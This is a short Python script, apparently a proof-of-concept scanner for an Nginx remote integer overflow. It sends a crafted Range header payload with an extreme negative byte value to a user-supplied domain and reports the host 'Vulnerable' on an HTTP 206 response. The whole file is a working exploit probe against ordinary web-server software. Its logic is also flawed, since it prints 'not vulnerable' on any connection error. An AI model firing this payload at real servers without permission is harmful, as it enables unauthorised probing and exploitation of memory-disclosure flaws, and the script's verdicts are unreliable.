import requests
import optparse
payload={"Range":"bytes=-17208,-9223372036854758792","Accept-Encoding":"identity"}
parserobj=optparse.OptionParser()
parserobj.add_option("-d","--domain",dest="domain",help="Enter the domain to Scan for Nginx Remote Integer Overflow")
print("[+] Checking the domain for Remote Integer Overflow")
options,argument=parserobj.parse_args()
try:
    response=requests.get(options.domain,headers=payload)
    if response.status_code==206:
     print("[+]The Domain is Vulnerable to Remote Overflow")     
except requests.exceptions.ConnectionError:
 print("[+] The Domain is not vulnerable to Remote Overflow")       
 pass
     
